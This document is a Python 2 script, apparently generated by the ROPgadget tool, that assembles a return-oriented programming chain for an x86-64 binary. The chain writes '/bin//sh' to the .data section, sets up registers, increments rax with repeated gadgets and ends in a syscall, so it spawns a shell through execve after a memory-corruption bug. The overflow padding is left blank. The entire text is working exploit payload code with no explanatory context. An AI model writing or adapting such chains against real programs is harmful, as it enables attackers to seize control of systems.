        #!/usr/bin/env python2
        # execve generated by ROPgadget

        from struct import pack

        # Padding goes here
        p = ''

        p += pack('<Q', 0x0000000000410093) # pop rsi ; ret
        p += pack('<Q', 0x00000000006b90e0) # @ .data
        p += pack('<Q', 0x0000000000415294) # pop rax ; ret
        p += '/bin//sh'
        p += pack('<Q', 0x000000000047f071) # mov qword ptr [rsi], rax ; ret
        p += pack('<Q', 0x0000000000410093) # pop rsi ; ret
        p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
        p += pack('<Q', 0x00000000004447f0) # xor rax, rax ; ret
        p += pack('<Q', 0x000000000047f071) # mov qword ptr [rsi], rax ; ret
        p += pack('<Q', 0x0000000000400686) # pop rdi ; ret
        p += pack('<Q', 0x00000000006b90e0) # @ .data
        p += pack('<Q', 0x0000000000410093) # pop rsi ; ret
        p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
        p += pack('<Q', 0x00000000004494b5) # pop rdx ; ret
        p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
        p += pack('<Q', 0x00000000004447f0) # xor rax, rax ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004744c0) # add rax, 1 ; ret
        p += pack('<Q', 0x00000000004011fc) # syscall
